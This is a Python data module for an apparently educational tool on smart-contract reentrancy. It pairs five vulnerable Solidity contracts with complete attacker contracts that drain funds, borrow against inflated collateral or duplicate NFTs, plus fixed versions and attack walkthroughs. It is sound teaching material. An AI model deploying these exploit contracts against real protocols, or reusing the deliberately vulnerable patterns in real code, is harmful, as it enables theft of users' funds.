"""
Reentrancy Attack Examples Data Module
Contains all 5 types of reentrancy vulnerabilities with code examples.
"""

EXAMPLES = [
    {
        "id": "single-function",
        "title": "Single-Function Reentrancy",
        "subtitle": "The DAO Hack ($60M)",
        "description": """Single-function reentrancy occurs when a contract makes an external call before finalizing state changes, 
and the same function is reentered within the external call. This is the simplest type of reentrancy which led to 
The DAO Hack of $60 million dollars and the hard fork of the Ethereum network, resulting in the creation of 
separate blockchains: the unaltered "Ethereum Classic" and the altered history Ethereum network we know today.""",
        "vulnerable_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        // VULNERABILITY: External call BEFORE state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // State update happens AFTER the external call
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}""",
        "attack_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // Start the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    // Fallback function - reenters withdraw()
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // REENTER!
        }
    }

    function collectFunds() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}""",
        "fixed_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // FIX 1: Use nonReentrant modifier
    // FIX 2: Follow CEI pattern (Checks-Effects-Interactions)
    function withdraw() public nonReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        // Effect: Update state BEFORE external call
        balances[msg.sender] = 0;

        // Interaction: External call AFTER state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}""",
        "attack_flow": [
            "Attacker deposits 1 ETH into VulnerableBank",
            "Attacker calls withdraw()",
            "Bank checks balance (1 ETH) ✓",
            "Bank sends 1 ETH to Attacker → triggers receive()",
            "receive() calls withdraw() again (REENTER)",
            "Bank checks balance (still 1 ETH!) ✓",
            "Bank sends another 1 ETH...",
            "Loop continues until bank is drained",
            "Finally, balances[attacker] = 0 (too late!)"
        ]
    },
    {
        "id": "cross-function",
        "title": "Cross-Function Reentrancy",
        "subtitle": "Partial Protection Bypass",
        "description": """Cross-function reentrancy occurs when multiple functions share state but only SOME have 
reentrancy protection. Even if withdraw() has nonReentrant, if transfer() doesn't, an attacker can call 
transfer() during the withdraw callback - before the balance is zeroed. This demonstrates why ALL functions 
that share state must have the nonReentrant modifier. Documented by Ackee Blockchain security research.""",
        "vulnerable_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

// FALSE SENSE OF SECURITY: withdraw has nonReentrant, but transfer doesn't!
contract Vault is ReentrancyGuard {
    mapping(address => uint256) private balances;

    function deposit() external payable nonReentrant {
        balances[msg.sender] += msg.value;
    }

    // PROTECTED: Has nonReentrant modifier
    function withdraw() public nonReentrant {
        uint256 amount = balances[msg.sender];
        
        // External call triggers receive() on attacker
        msg.sender.call{value: amount}("");
        
        // VULNERABILITY: Balance zeroed AFTER external call
        balances[msg.sender] = 0;
    }

    // UNPROTECTED: Missing nonReentrant modifier!
    // Can be called during withdraw's external call
    function transfer(address to, uint256 amount) public {
        if (balances[msg.sender] >= amount) {
            balances[to] += amount;
            balances[msg.sender] -= amount;
        }
    }

    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}""",
        "attack_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function transfer(address to, uint256 amount) external;
    function getBalance(address) external view returns (uint256);
}

contract Attacker {
    IVault public vault;
    Attacker2 public attacker2;
    uint256 public amount = 1 ether;

    constructor(IVault _vault) payable {
        vault = _vault;
    }

    function setAttacker2(address _attacker2) public {
        attacker2 = Attacker2(_attacker2);
    }

    function attack() public payable {
        uint256 value = address(this).balance;
        vault.deposit{value: value}();
        
        // Loop: withdraw → transfer → repeat until vault is drained
        while (address(vault).balance >= amount) {
            vault.withdraw();
            attacker2.sendBack(value, address(this));
        }
    }

    // Called during vault.withdraw() external call
    receive() external payable {
        // Transfer our "not yet zeroed" balance to Attacker2
        // This works because transfer() has NO nonReentrant guard!
        vault.transfer(address(attacker2), msg.value);
    }
}

// Accomplice contract to hold and return funds
contract Attacker2 {
    IVault public vault;

    constructor(IVault _vault) {
        vault = _vault;
    }

    // Transfer balance back to Attacker to repeat the exploit
    function sendBack(uint256 value, address attacker) public {
        vault.transfer(attacker, value);
    }
}

/*
 * ATTACK RESULT (from Ackee's test):
 * - Vault starts with 10 ETH
 * - Attacker deposits 1 ETH
 * - After attack: Vault = 0 ETH, Attacker = 11 ETH
 * - PROFIT: 10 ETH stolen!
 */""",
        "fixed_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureVault is ReentrancyGuard {
    mapping(address => uint256) private balances;

    function deposit() external payable nonReentrant {
        balances[msg.sender] += msg.value;
    }

    // FIX 1: Apply CEI pattern (update state BEFORE external call)
    function withdraw() public nonReentrant {
        uint256 amount = balances[msg.sender];
        
        // EFFECT: Update state FIRST
        balances[msg.sender] = 0;
        
        // INTERACTION: External call LAST
        msg.sender.call{value: amount}("");
    }

    // FIX 2: ALL functions sharing state must have nonReentrant
    function transfer(address to, uint256 amount) public nonReentrant {
        if (balances[msg.sender] >= amount) {
            balances[to] += amount;
            balances[msg.sender] -= amount;
        }
    }
}

/*
 * KEY LESSON: ReentrancyGuard only works if ALL functions 
 * that share state have the nonReentrant modifier!
 * 
 * Partial protection = No protection
 */""",
        "attack_flow": [
            "Vault has 10 ETH from users, Attacker deposits 1 ETH",
            "Attacker calls withdraw() — has nonReentrant ✓",
            "withdraw() sends 1 ETH → triggers Attacker.receive()",
            "Inside receive(): call transfer(attacker2, 1 ETH)",
            "transfer() has NO nonReentrant — bypasses guard!",
            "transfer() checks balance: still 1 ETH (not zeroed yet!)",
            "Balance moved to Attacker2, then sent back to Attacker",
            "withdraw() finishes, sets balance to 0 (already empty!)",
            "Loop repeats: withdraw → transfer → repeat",
            "Result: Vault drained from 10 ETH to 0 ETH!"
        ]
    },
    {
        "id": "cross-contract",
        "title": "Cross-Contract Reentrancy",
        "subtitle": "Shared State Across Contracts",
        "description": """Cross-contract reentrancy occurs when multiple contracts share the same state and one contract 
makes an external call before updating the shared state. Even with the CEI pattern in individual contracts, 
if shared state across contracts isn't updated before external calls, reentrancy can cause critical vulnerabilities.""",
        "vulnerable_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Shared state storage contract
contract TokenLedger {
    mapping(address => uint256) public balances;
    address public vault;
    address public lending;

    modifier onlyAuthorized() {
        require(msg.sender == vault || msg.sender == lending);
        _;
    }

    function setBalance(address user, uint256 amount) external onlyAuthorized {
        balances[user] = amount;
    }

    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}

// Vault contract - handles deposits/withdrawals
contract VulnerableVault {
    TokenLedger public ledger;

    constructor(address _ledger) {
        ledger = TokenLedger(_ledger);
    }

    function deposit() external payable {
        uint256 current = ledger.getBalance(msg.sender);
        ledger.setBalance(msg.sender, current + msg.value);
    }

    function withdraw() external {
        uint256 balance = ledger.getBalance(msg.sender);
        require(balance > 0, "No balance");

        // VULNERABILITY: External call before updating shared ledger
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success);

        ledger.setBalance(msg.sender, 0);
    }
}

// Lending contract - uses same ledger for collateral
contract VulnerableLending {
    TokenLedger public ledger;

    constructor(address _ledger) {
        ledger = TokenLedger(_ledger);
    }

    function borrow(uint256 amount) external {
        uint256 collateral = ledger.getBalance(msg.sender);
        require(collateral >= amount * 2, "Insufficient collateral");

        // Lend based on current collateral value
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}""",
        "attack_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

interface ILending {
    function borrow(uint256 amount) external;
}

contract CrossContractAttacker {
    IVault public vault;
    ILending public lending;
    address public owner;
    uint256 public attackPhase;

    constructor(address _vault, address _lending) {
        vault = IVault(_vault);
        lending = ILending(_lending);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 2 ether);
        
        // Deposit as collateral
        vault.deposit{value: msg.value}();
        
        // Start withdraw - this triggers the exploit
        vault.withdraw();
    }

    receive() external payable {
        if (attackPhase == 0) {
            attackPhase = 1;
            // During vault withdraw, borrow from lending
            // Ledger still shows our full balance as collateral!
            lending.borrow(1 ether);
        }
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}""",
        "fixed_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// FIX: Use a shared lock across contracts
contract SharedLock {
    bool private _locked;

    modifier sharedNonReentrant() {
        require(!_locked, "Locked");
        _locked = true;
        _;
        _locked = false;
    }

    function isLocked() external view returns (bool) {
        return _locked;
    }
}

contract SecureVault is ReentrancyGuard {
    TokenLedger public ledger;
    SharedLock public lock;

    constructor(address _ledger, address _lock) {
        ledger = TokenLedger(_ledger);
        lock = SharedLock(_lock);
    }

    function withdraw() external nonReentrant {
        require(!lock.isLocked(), "Cross-contract lock");
        
        uint256 balance = ledger.getBalance(msg.sender);
        require(balance > 0);

        // CEI: Update shared state FIRST
        ledger.setBalance(msg.sender, 0);

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success);
    }
}""",
        "attack_flow": [
            "Attacker deposits 2 ETH into Vault",
            "Ledger records: balances[attacker] = 2 ETH",
            "Attacker calls vault.withdraw()",
            "Vault sends 2 ETH → triggers receive()",
            "Inside receive(), call lending.borrow(1 ETH)",
            "Lending checks ledger: collateral = 2 ETH ✓",
            "Lending sends 1 ETH loan",
            "vault.withdraw() continues, zeros balance",
            "Attacker received: 2 ETH + 1 ETH loan = 3 ETH!"
        ]
    },
    {
        "id": "read-only",
        "title": "Read-Only Reentrancy",
        "subtitle": "View Function Manipulation",
        "description": """Read-only reentrancy occurs when a view function is reentered during an inconsistent state.
Unlike typical reentrancy, view functions are usually unguarded since they don't modify state.
However, if relied upon by other protocols, wrong values can be returned during reentrancy.
Most notably, Curve's get_virtual_price was exploitable by reentering during remove_liquidity:
LP tokens are burned FIRST (reducing totalSupply), then ETH is sent (triggering callback),
while balances are still high - causing get_virtual_price() to return an INFLATED value.""",
        "vulnerable_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Simulated Curve-like ETH/stETH pool
contract CurveLikePool {
    uint256 public totalSupply;    // LP token supply
    mapping(address => uint256) public balanceOf;  // LP balances
    
    uint256 public ethBalance;     // ETH in pool
    uint256 public tokenBalance;   // stETH in pool

    function addLiquidity() external payable returns (uint256 shares) {
        shares = msg.value;  // Simplified 1:1
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        ethBalance += msg.value;
    }

    function removeLiquidity(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares);
        
        uint256 ethAmount = (shares * ethBalance) / totalSupply;
        
        // STEP 1: Burn LP tokens FIRST (reduces totalSupply)
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        
        // STEP 2: Send ETH - triggers callback!
        // At this point: totalSupply reduced, but ethBalance NOT YET reduced
        (bool success, ) = msg.sender.call{value: ethAmount}("");
        require(success);
        
        // STEP 3: Update balances AFTER callback
        ethBalance -= ethAmount;
    }

    // VIEW FUNCTION - No reentrancy guard!
    // Can be called during callback when state is inconsistent
    function get_virtual_price() external view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        // D = ethBalance + tokenBalance (simplified)
        uint256 D = ethBalance + tokenBalance;
        // During callback: D is still high, but totalSupply is reduced!
        // Result: INFLATED price returned
        return (D * 1e18) / totalSupply;
    }
}

// Lending protocol that trusts Curve's price oracle
contract VulnerableLending {
    CurveLikePool public pool;
    mapping(address => uint256) public lpDeposits;  // LP tokens as collateral

    constructor(address _pool) {
        pool = CurveLikePool(_pool);
    }

    function depositLPCollateral(uint256 amount) external {
        // User deposits LP tokens as collateral
        lpDeposits[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        // Value LP collateral using get_virtual_price()
        uint256 lpValue = (lpDeposits[msg.sender] * pool.get_virtual_price()) / 1e18;
        
        require(lpValue >= amount * 2, "Insufficient collateral");
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}""",
        "attack_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICurvePool {
    function addLiquidity() external payable returns (uint256);
    function removeLiquidity(uint256) external;
    function get_virtual_price() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface ILending {
    function depositLPCollateral(uint256) external;
    function borrow(uint256) external;
}

contract ReadOnlyAttacker {
    ICurvePool public pool;
    ILending public lending;
    address public owner;
    bool public exploiting;
    uint256 public normalPrice;
    uint256 public manipulatedPrice;

    constructor(address _pool, address _lending) {
        pool = ICurvePool(_pool);
        lending = ILending(_lending);
        owner = msg.sender;
    }

    function attack() external payable {
        // Record normal price
        normalPrice = pool.get_virtual_price();
        
        // Step 1: Add liquidity to get LP tokens
        uint256 lpReceived = pool.addLiquidity{value: msg.value}();
        
        // Step 2: Deposit SOME LP tokens as collateral in lending
        lending.depositLPCollateral(lpReceived / 10);
        
        // Step 3: Remove liquidity with remaining LP tokens
        // This triggers the exploit in receive()
        exploiting = true;
        pool.removeLiquidity(lpReceived * 9 / 10);
    }

    receive() external payable {
        if (exploiting) {
            exploiting = false;
            
            // During removeLiquidity callback:
            // - totalSupply was REDUCED (LP tokens burned)
            // - ethBalance NOT YET reduced
            // - get_virtual_price() = (ethBalance + tokenBalance) / totalSupply
            // - Result: INFLATED price!
            
            manipulatedPrice = pool.get_virtual_price();
            // manipulatedPrice >> normalPrice (could be 2x or more!)
            
            // Borrow more than our collateral is actually worth
            lending.borrow(1 ether);
        }
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}""",
        "fixed_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// FIX 1: Update ALL state before external calls
contract SecureCurvePool {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    uint256 public ethBalance;
    uint256 public tokenBalance;
    
    // Reentrancy lock for the pool
    bool private locked;

    function removeLiquidity(uint256 shares) external {
        require(!locked, "Locked");
        locked = true;
        
        require(balanceOf[msg.sender] >= shares);
        uint256 ethAmount = (shares * ethBalance) / totalSupply;
        
        // FIX: Update ALL state BEFORE external call
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        ethBalance -= ethAmount;  // <-- Now updated BEFORE callback
        
        (bool success, ) = msg.sender.call{value: ethAmount}("");
        require(success);
        
        locked = false;
    }

    function get_virtual_price() external view returns (uint256) {
        // Now consistent even during removeLiquidity
        if (totalSupply == 0) return 1e18;
        return ((ethBalance + tokenBalance) * 1e18) / totalSupply;
    }
}

// FIX 2: For protocols consuming price oracles
contract SecureLending {
    // Use TWAP (Time-Weighted Average Price) instead of spot price
    uint256 public cachedPrice;
    uint256 public lastUpdateBlock;
    
    function updatePriceFromOracle(uint256 newPrice) external {
        // Only allow updates in different blocks (prevents same-tx manipulation)
        require(block.number > lastUpdateBlock, "Same block");
        cachedPrice = newPrice;
        lastUpdateBlock = block.number;
    }
    
    function borrow(uint256 amount, uint256 lpCollateral) external {
        // Use cached price, not live oracle
        uint256 lpValue = (lpCollateral * cachedPrice) / 1e18;
        require(lpValue >= amount * 2, "Insufficient");
        // ...
    }
}""",
        "attack_flow": [
            "Attacker adds liquidity → gets LP tokens",
            "Attacker deposits some LP as collateral in Lending",
            "Attacker calls removeLiquidity()",
            "Pool BURNS LP tokens (totalSupply reduced)",
            "Pool sends ETH → triggers receive() callback",
            "ethBalance NOT YET reduced!",
            "get_virtual_price() = D/totalSupply = HIGH/LOW = INFLATED!",
            "Attacker borrows using inflated collateral value",
            "removeLiquidity() finishes, price returns to normal (too late)"
        ]
    },
    {
        "id": "cross-chain",
        "title": "Cross-Chain Reentrancy",
        "subtitle": "NFT Duplication via _safeMint",
        "description": """Cross-chain reentrancy exploits the interaction between cross-chain messaging and unsafe external calls. 
When a contract uses _safeMint() (which calls onERC721Received on the recipient), an attacker can reenter before 
state updates complete. In cross-chain NFT contracts, this allows creating duplicate tokens across chains - 
an attack impossible in single-chain environments. This vulnerability was documented by security researchers 
at QuantumBrief and Ackee Blockchain.""",
        "vulnerable_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// Cross-chain NFT that can exist on multiple chains
// Only ONE token per ID should exist across ALL chains
contract CrossChainWarriors is ERC721 {
    uint256 public tokenIds;
    address public validator;  // Bridge validator
    
    event CrossChainTransfer(
        uint256 indexed tokenId,
        address indexed from,
        address indexed to,
        uint256 destChain
    );

    constructor(address _validator) ERC721("CrossChainWarriors", "CCW") {
        validator = _validator;
    }

    // Mint new NFT - tokenIds incremented AFTER _safeMint
    function mint(address to) external {
        uint256 newId = tokenIds;
        
        // VULNERABILITY: _safeMint makes external call via onERC721Received
        // tokenIds is incremented AFTER this call completes
        _safeMint(to, newId);
        
        // State update AFTER external call - CEI violation!
        tokenIds++;
    }

    // Transfer NFT to another chain - burns on source chain
    function crossChainTransfer(
        uint256 tokenId,
        address recipient,
        uint256 destChain
    ) external {
        require(ownerOf(tokenId) == msg.sender, "Not owner");
        
        // Burn the token on this chain
        _burn(tokenId);
        
        // Emit event for bridge validators to pick up
        // Validators will call mint on destination chain
        emit CrossChainTransfer(tokenId, msg.sender, recipient, destChain);
    }

    // Called by validator to mint tokens arriving from other chains
    function mintFromBridge(
        uint256 tokenId,
        address recipient
    ) external {
        require(msg.sender == validator, "Only validator");
        _safeMint(recipient, tokenId);
    }
}""",
        "attack_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface ICrossChainWarriors {
    function mint(address to) external;
    function crossChainTransfer(
        uint256 tokenId,
        address recipient,
        uint256 destChain
    ) external;
    function tokenIds() external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
}

contract CrossChainAttacker is IERC721Receiver {
    ICrossChainWarriors public nft;
    address public owner;
    bool public attacking;
    uint256 public stolenTokenId;
    uint256 public destChain;
    address public accomplice;  // Address on destination chain

    constructor(
        address _nft,
        uint256 _destChain,
        address _accomplice
    ) {
        nft = ICrossChainWarriors(_nft);
        owner = msg.sender;
        destChain = _destChain;
        accomplice = _accomplice;
    }

    // Step 1: Initiate attack by calling mint
    function attack() external {
        attacking = true;
        stolenTokenId = nft.tokenIds();  // This will be our token ID
        
        // This triggers onERC721Received callback
        nft.mint(address(this));
    }

    // Step 2: Called by _safeMint BEFORE tokenIds++ executes
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        
        if (attacking) {
            attacking = false;
            
            // We now own tokenId, but tokenIds hasn't incremented yet!
            // Transfer this token to Chain B
            nft.crossChainTransfer(tokenId, accomplice, destChain);
            // Token is burned, event emitted for bridge
            
            // Now call mint() again - tokenIds still equals our tokenId!
            // This mints ANOTHER token with the SAME ID on Chain A
            nft.mint(owner);
        }
        
        return IERC721Receiver.onERC721Received.selector;
    }
}

/*
 * ATTACK RESULT:
 * - Token ID #0 exists on Chain A (owned by attacker's owner)
 * - Token ID #0 ALSO exists on Chain B (owned by accomplice)
 * - The NFT has been duplicated across chains!
 * 
 * This breaks the fundamental invariant that only ONE token
 * per ID should exist across all chains.
 */""",
        "fixed_code": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureCrossChainWarriors is ERC721, ReentrancyGuard {
    uint256 public tokenIds;
    address public validator;
    
    event CrossChainTransfer(
        uint256 indexed tokenId,
        address indexed from,
        address indexed to,
        uint256 destChain
    );

    constructor(address _validator) ERC721("CrossChainWarriors", "CCW") {
        validator = _validator;
    }

    // FIX 1: Increment tokenIds BEFORE _safeMint (CEI pattern)
    // FIX 2: Add nonReentrant modifier
    function mint(address to) external nonReentrant {
        uint256 newId = tokenIds;
        
        // Effect: Update state BEFORE external call
        tokenIds++;
        
        // Interaction: External call AFTER state update
        _safeMint(to, newId);
    }

    // FIX 3: Add nonReentrant to functions sharing state
    function crossChainTransfer(
        uint256 tokenId,
        address recipient,
        uint256 destChain
    ) external nonReentrant {
        require(ownerOf(tokenId) == msg.sender, "Not owner");
        _burn(tokenId);
        emit CrossChainTransfer(tokenId, msg.sender, recipient, destChain);
    }

    function mintFromBridge(
        uint256 tokenId,
        address recipient
    ) external nonReentrant {
        require(msg.sender == validator, "Only validator");
        _safeMint(recipient, tokenId);
    }
}

/*
 * ALTERNATIVE FIX: Post-external call verification
 * 
 * function mint(address to) external {
 *     uint256 expectedId = tokenIds;
 *     _safeMint(to, expectedId);
 *     
 *     // Verify state wasn't manipulated during callback
 *     require(tokenIds == expectedId, "Reentrancy detected");
 *     tokenIds++;
 * }
 */""",
        "attack_flow": [
            "Attacker contract calls mint() on Chain A",
            "_safeMint() mints token ID #0 to attacker",
            "_safeMint() calls onERC721Received() on attacker contract",
            "tokenIds is STILL 0 (not incremented yet!)",
            "Inside callback: call crossChainTransfer(0, accomplice, chainB)",
            "Token #0 is BURNED, event emitted for bridge validators",
            "Still inside callback: call mint() again",
            "mint() creates ANOTHER token #0 (tokenIds still = 0)",
            "Original mint() finally increments tokenIds to 1",
            "Result: Token #0 on Chain A + Token #0 on Chain B = DUPLICATE!"
        ]
    }
]

def get_all_examples():
    """Return all reentrancy examples."""
    return EXAMPLES

def get_example_by_id(example_id):
    """Return a specific example by ID."""
    for example in EXAMPLES:
        if example["id"] == example_id:
            return example
    return None
